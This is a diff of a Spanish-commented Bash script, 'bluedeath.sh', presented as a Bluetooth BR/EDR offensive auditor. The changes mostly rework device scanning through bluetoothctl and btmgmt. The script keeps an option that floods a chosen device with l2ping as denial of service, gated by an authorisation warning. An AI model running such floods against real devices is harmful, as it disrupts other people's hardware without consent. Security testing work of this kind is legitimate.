@@ -26,6 +26,7 @@ LOG_DIR="${SCRIPT_DIR}/logs"
 LAST_SCAN_FILE="${LOG_DIR}/last_scan.txt"
 LOG_FILE="${LOG_DIR}/bluedeath_$(date +%F_%H-%M-%S).log"
 BT_INTERFACE="${BT_INTERFACE:-hci0}"
+SCAN_TIMEOUT="${SCAN_TIMEOUT:-15}"  # segundos para bluetoothctl scan
 
 RED="\e[31m"
 GREEN="\e[32m"
@@ -34,8 +35,7 @@ BLUE="\e[34m"
 PURPLE="\e[35m"
 RESET="\e[0m"
 
-# Stack detectado: "modern" | "legacy" | ""
-BT_STACK=""
+BT_STACK=""  # "modern" | "legacy"
 
 # ---------- Helpers ---------- #
 
@@ -66,22 +66,27 @@ detect_stack() {
     fi
 
     if ! command -v l2ping &>/dev/null; then
-        warn "l2ping no encontrado. Las funciones --active y --dos no estaran disponibles."
+        warn "l2ping no encontrado. --active y --dos no estaran disponibles."
     fi
 }
 
 check_interface() {
     case "${BT_STACK}" in
         modern)
-            if ! btmgmt info 2>/dev/null | grep -q "hci"; then
-                error "No se detectaron interfaces Bluetooth activas."
-                exit 1
+            # Verificar que hay al menos una interfaz hci levantada
+            if ! btmgmt info 2>/dev/null | grep -qE "^Index [0-9]+"; then
+                # fallback: intentar con bluetoothctl
+                if ! bluetoothctl show 2>/dev/null | grep -q "Controller"; then
+                    error "No se detectaron interfaces Bluetooth activas."
+                    printf "  Prueba: sudo systemctl start bluetooth\n"
+                    exit 1
+                fi
             fi
             ;;
         legacy)
             if ! hciconfig "${BT_INTERFACE}" &>/dev/null; then
                 error "La interfaz '${BT_INTERFACE}' no existe o no esta activa."
-                printf "Comprueba 'hciconfig' o ajusta BT_INTERFACE.\n"
+                printf "  Comprueba 'hciconfig' o ajusta BT_INTERFACE.\n"
                 exit 1
             fi
             ;;
@@ -90,7 +95,7 @@ check_interface() {
 
 banner() {
     printf "${PURPLE}"
-    cat <<'EOF'
+    cat <<'BANNER'
 +------------------------------------------------------+
 |                                                      |
 |  ██████╗ ██╗     ██╗   ██████╗ ███████╗             |
@@ -110,7 +115,7 @@ banner() {
 |  Bluetooth BR/EDR offensive auditor                 |
 |  by theoffsecgirl                                   |
 +------------------------------------------------------+
-EOF
+BANNER
     printf "${RESET}"
     printf "  Interface : %s\n" "${BT_INTERFACE}"
     printf "  Stack     : %s\n\n" "${BT_STACK}"
@@ -123,7 +128,7 @@ Uso: sudo ./bluedeath.sh [opcion]
 Opciones:
   --scan            Escanea dispositivos Bluetooth BR/EDR cercanos
   --connected       Muestra conexiones Bluetooth activas
-  --inquiry         Inquiry scan (dispositivos conectables)
+  --inquiry         Inquiry scan (BR/EDR)
   --active          Comprueba dispositivos activos via l2ping
   --dos MAC         l2ping flood controlado contra MAC
   --interface IF    Usa la interfaz IF (default: hci0)
@@ -132,51 +137,107 @@ Opciones:
 
 Variable de entorno:
   BT_INTERFACE=hci1 sudo ./bluedeath.sh --scan
+  SCAN_TIMEOUT=20   sudo ./bluedeath.sh --scan  (default: 15s)
 EOF
 }
 
 # ---------- Core: moderno ---------- #
 
+# scan_modern usa un coproc para controlar bluetoothctl de forma no interactiva.
+# Razon: 'bluetoothctl scan on' abre un shell interactivo propio;
+# timeout + pipe no capturan bien los eventos en todas las distros.
+# El coproc permite escribir comandos y leer la salida linea a linea.
 scan_modern() {
-    info "Iniciando escaneo con bluetoothctl (10s)…"
+    info "Iniciando escaneo BR/EDR con bluetoothctl (${SCAN_TIMEOUT}s)..."
     mkdir -p "${LOG_DIR}"
+    : > "${LAST_SCAN_FILE}"
 
-    # bluetoothctl scan on durante 10 segundos, capturamos NEW y CHG Device
-    timeout 10 bluetoothctl scan on 2>/dev/null | grep -E "Device [0-9A-F:]{17}" \
-        | awk '{print $3, $4}' | sort -u | tee "${LAST_SCAN_FILE}" || true
+    # Intentar primero btmgmt find (mas fiable para BR/EDR)
+    if btmgmt find 2>/dev/null | grep -oE "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" \
+        | sort -u >> "${LAST_SCAN_FILE}"; then
+        ok "btmgmt find completado."
+    fi
 
-    # Complementamos con btmgmt find para dispositivos BR/EDR
-    btmgmt find 2>/dev/null | grep -E "^[0-9A-F:]{17}" | tee -a "${LAST_SCAN_FILE}" || true
+    # Complementar con bluetoothctl via coproc durante SCAN_TIMEOUT segundos
+    local tmp_out
+    tmp_out="$(mktemp)"
 
-    sort -u "${LAST_SCAN_FILE}" -o "${LAST_SCAN_FILE}" 2>/dev/null || true
-    ok "Escaneo completado. Resultados en ${LAST_SCAN_FILE}"
+    (
+        # Abrir bluetoothctl en modo batch con coproc
+        coproc BTC { bluetoothctl 2>/dev/null; }
+
+        # Activar scan
+        printf 'scan on\n' >&"${BTC[1]}"
+        sleep "${SCAN_TIMEOUT}"
+        printf 'scan off\n' >&"${BTC[1]}"
+        sleep 1
+        printf 'quit\n' >&"${BTC[1]}"
+
+        # Leer toda la salida del coproc
+        while IFS= read -r -t 2 line <&"${BTC[0]}" 2>/dev/null; do
+            echo "${line}"
+        done
+
+        wait "${BTC_PID}" 2>/dev/null || true
+    ) > "${tmp_out}" 2>/dev/null
+
+    # Extraer MACs de la salida de bluetoothctl
+    grep -oE "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" "${tmp_out}" \
+        >> "${LAST_SCAN_FILE}" 2>/dev/null || true
+    rm -f "${tmp_out}"
+
+    # Deduplicar
+    if [[ -s "${LAST_SCAN_FILE}" ]]; then
+        sort -u "${LAST_SCAN_FILE}" -o "${LAST_SCAN_FILE}"
+        ok "Escaneo completado. $(wc -l < "${LAST_SCAN_FILE}") dispositivos en ${LAST_SCAN_FILE}"
+    else
+        warn "No se detectaron dispositivos. Asegurate de que hay dispositivos Bluetooth cercanos y visibles."
+    fi
+
     log "Scan moderno completado."
 }
 
 list_connected_modern() {
-    info "Dispositivos pareados/conectados (bluetoothctl):"
-    bluetoothctl devices Connected 2>/dev/null || bluetoothctl devices 2>/dev/null | head -20
+    info "Dispositivos conectados (bluetoothctl):"
+    # bluetoothctl devices Connected es mas fiable que devices a secas
+    if ! bluetoothctl devices Connected 2>/dev/null; then
+        bluetoothctl devices 2>/dev/null | head -20 || true
+    fi
 }
 
 inquiry_modern() {
-    info "Inquiry scan con btmgmt (BR/EDR, 15s)…"
-    btmgmt find --bredr 2>/dev/null | tee -a "${LOG_FILE}" || {
-        warn "btmgmt find --bredr no soportado. Usando bluetoothctl…"
-        timeout 15 bluetoothctl scan on 2>/dev/null | grep -E "Device" | tee -a "${LOG_FILE}" || true
-    }
+    info "Inquiry scan BR/EDR con btmgmt (${SCAN_TIMEOUT}s)..."
+    if btmgmt find --bredr 2>/dev/null | tee -a "${LOG_FILE}"; then
+        ok "btmgmt find --bredr completado."
+    else
+        warn "--bredr no soportado en esta version de btmgmt. Usando bluetoothctl..."
+        # Fallback: bluetoothctl via coproc igual que scan_modern pero sin guardar en LAST_SCAN_FILE
+        local tmp_out
+        tmp_out="$(mktemp)"
+        (
+            coproc BTC2 { bluetoothctl 2>/dev/null; }
+            printf 'scan on\n' >&"${BTC2[1]}"
+            sleep "${SCAN_TIMEOUT}"
+            printf 'scan off\n' >&"${BTC2[1]}"
+            sleep 1
+            printf 'quit\n' >&"${BTC2[1]}"
+            while IFS= read -r -t 2 line <&"${BTC2[0]}" 2>/dev/null; do echo "${line}"; done
+            wait "${BTC2_PID}" 2>/dev/null || true
+        ) > "${tmp_out}" 2>/dev/null
+        grep -E "Device|NEW" "${tmp_out}" | tee -a "${LOG_FILE}" || true
+        rm -f "${tmp_out}"
+    fi
 }
 
 # ---------- Core: legacy ---------- #
 
 scan_legacy() {
-    info "Iniciando escaneo con hcitool scan…"
+    info "Iniciando escaneo con hcitool scan..."
     mkdir -p "${LOG_DIR}"
-
     if ! hcitool -i "${BT_INTERFACE}" scan > "${LAST_SCAN_FILE}" 2>>"${LOG_FILE}"; then
         error "Error durante el escaneo."
         return 1
     fi
-
     ok "Escaneo completado."
     sed '1d' "${LAST_SCAN_FILE}" || true
     log "Scan legacy completado."
@@ -188,35 +249,15 @@ list_connected_legacy() {
 }
 
 inquiry_legacy() {
-    info "Inquiry scan con hcitool inq…"
+    info "Inquiry scan con hcitool inq..."
     hcitool -i "${BT_INTERFACE}" inq | tee -a "${LOG_FILE}"
 }
 
-# ---------- Dispatch por stack ---------- #
+# ---------- Dispatch ---------- #
 
-scan_devices() {
-    banner
-    case "${BT_STACK}" in
-        modern) scan_modern ;;
-        legacy) scan_legacy ;;
-    esac
-}
-
-list_connected() {
-    banner
-    case "${BT_STACK}" in
-        modern) list_connected_modern ;;
-        legacy) list_connected_legacy ;;
-    esac
-}
-
-inquiry_scan() {
-    banner
-    case "${BT_STACK}" in
-        modern) inquiry_modern ;;
-        legacy) inquiry_legacy ;;
-    esac
-}
+scan_devices()   { banner; case "${BT_STACK}" in modern) scan_modern   ;; legacy) scan_legacy   ;; esac; }
+list_connected() { banner; case "${BT_STACK}" in modern) list_connected_modern ;; legacy) list_connected_legacy ;; esac; }
+inquiry_scan()   { banner; case "${BT_STACK}" in modern) inquiry_modern ;; legacy) inquiry_legacy ;; esac; }
 
 # ---------- Seleccion de dispositivo ---------- #
 
@@ -226,7 +267,6 @@ select_device_from_last_scan() {
         return 1
     fi
 
-    # Extraer MACs validas (formato XX:XX:XX:XX:XX:XX)
     mapfile -t macs < <(grep -oE "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" "${LAST_SCAN_FILE}" | sort -u)
 
     if (( ${#macs[@]} == 0 )); then
@@ -239,7 +279,7 @@ select_device_from_last_scan() {
         printf "  [%d] %s\n" "$((i+1))" "${macs[$i]}"
     done
 
-    printf "\nSelecciona un dispositivo por numero: "
+    printf "\nSelecciona numero: "
     read -r choice
 
     if ! [[ "${choice}" =~ ^[0-9]+$ ]] || (( choice < 1 || choice > ${#macs[@]} )); then
@@ -252,7 +292,7 @@ select_device_from_last_scan() {
     return 0
 }
 
-# ---------- Active check y DoS (l2ping) ---------- #
+# ---------- l2ping ---------- #
 
 check_active_devices() {
     banner
@@ -260,39 +300,32 @@ check_active_devices() {
         error "l2ping no disponible. Instala bluez-tools."
         return 1
     fi
-
     if ! select_device_from_last_scan; then return 1; fi
-
-    info "Enviando 3 paquetes l2ping a ${SELECTED_MAC}…"
+    info "Enviando 3 paquetes l2ping a ${SELECTED_MAC}..."
     if l2ping -i "${BT_INTERFACE}" -c 3 "${SELECTED_MAC}" 2>&1 | tee -a "${LOG_FILE}"; then
         ok "Dispositivo activo."
     else
-        warn "El dispositivo no respondio a l2ping."
+        warn "Sin respuesta a l2ping."
     fi
 }
 
 dos_attack() {
     local mac="$1"
     banner
-
     if ! command -v l2ping &>/dev/null; then
         error "l2ping no disponible. Instala bluez-tools."
         return 1
     fi
-
-    warn "Vas a iniciar un l2ping flood contra: ${mac}"
-    printf "Usa esto SOLO en entornos controlados y con autorizacion explicita.\n"
+    warn "l2ping flood contra: ${mac}"
+    printf "SOLO en entornos controlados con autorizacion explicita.\n"
     printf "Continuar? [y/N]: "
     read -r confirm
-
     if [[ "${confirm}" != "y" && "${confirm}" != "Y" ]]; then
         info "Operacion cancelada."
         return
     fi
-
-    info "Iniciando l2ping flood (CTRL+C para detener)…"
+    info "Iniciando l2ping flood (CTRL+C para detener)..."
     log "l2ping flood contra ${mac} desde ${BT_INTERFACE}"
-
     l2ping -i "${BT_INTERFACE}" -f "${mac}" 2>&1 | tee -a "${LOG_FILE}" || true
     ok "l2ping flood detenido."
 }
@@ -313,30 +346,30 @@ show_menu() {
 EOF
         printf "\nOpcion: "
         read -r opt
-
         case "${opt}" in
-            1) scan_devices;         read -rp $'\nENTER para continuar… ' _ ;;
-            2) list_connected;       read -rp $'\nENTER para continuar… ' _ ;;
-            3) inquiry_scan;         read -rp $'\nENTER para continuar… ' _ ;;
-            4) check_active_devices; read -rp $'\nENTER para continuar… ' _ ;;
+            1) scan_devices;         read -rp $'\nENTER para continuar... ' _ ;;
+            2) list_connected;       read -rp $'\nENTER para continuar... ' _ ;;
+            3) inquiry_scan;         read -rp $'\nENTER para continuar... ' _ ;;
+            4) check_active_devices; read -rp $'\nENTER para continuar... ' _ ;;
             5)
                 if [[ ! -f "${LAST_SCAN_FILE}" ]] || [[ ! -s "${LAST_SCAN_FILE}" ]]; then
-                    warn "Ejecuta primero la opcion 1 (escaneo)."
-                    read -rp $'\nENTER para continuar… ' _
+                    warn "Ejecuta primero la opcion 1."
+                    read -rp $'\nENTER para continuar... ' _
                     continue
                 fi
-                if select_device_from_last_scan; then
-                    dos_attack "${SELECTED_MAC}"
-                fi
-                read -rp $'\nENTER para continuar… ' _
+                if select_device_from_last_scan; then dos_attack "${SELECTED_MAC}"; fi
+                read -rp $'\nENTER para continuar... ' _
                 ;;
             6)
                 printf "\nInterfaz: %s  |  Stack: %s\n" "${BT_INTERFACE}" "${BT_STACK}"
                 case "${BT_STACK}" in
-                    modern) btmgmt info 2>/dev/null | head -10 || bluetoothctl show 2>/dev/null | head -10 ;;
+                    modern)
+                        btmgmt info 2>/dev/null | head -12 \
+                            || bluetoothctl show 2>/dev/null | head -12 || true
+                        ;;
                     legacy) hciconfig "${BT_INTERFACE}" 2>/dev/null || true ;;
                 esac
-                read -rp $'\nENTER para continuar… ' _
+                read -rp $'\nENTER para continuar... ' _
                 ;;
             7) info "Saliendo."; exit 0 ;;
             *) warn "Opcion no valida." ;;
@@ -356,8 +389,7 @@ main() {
         exit 0
     fi
 
-    local action=""
-    local dos_mac=""
+    local action="" dos_mac=""
 
     while (( $# > 0 )); do
         case "$1" in
